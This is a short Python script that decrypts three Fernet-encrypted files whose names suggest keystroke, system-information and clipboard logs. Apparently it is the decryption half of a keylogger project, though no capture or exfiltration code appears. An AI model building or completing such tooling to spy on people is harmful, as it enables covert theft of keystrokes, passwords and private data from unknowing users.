from cryptography.fernet import Fernet


e_key_info="e_log.txt"
e_sys_info="e_sysinfo.text"
e_clipboard_info="e_clipboard.txt"


encrypted_files = [e_key_info,e_clipboard_info,e_sys_info]

# Load the same key used for encryption
with open("encryption.key", "rb") as key_file:
    key = key_file.read()

fernet = Fernet(key)


#decrypt the file
for file_path in encrypted_files:
    with open(file_path,'rb') as d:
        data = d.read()

    decrypt = fernet.decrypt(data)


    with open(file_path.replace("e_","de_"),'wb') as d:
        d.write(decrypt)    



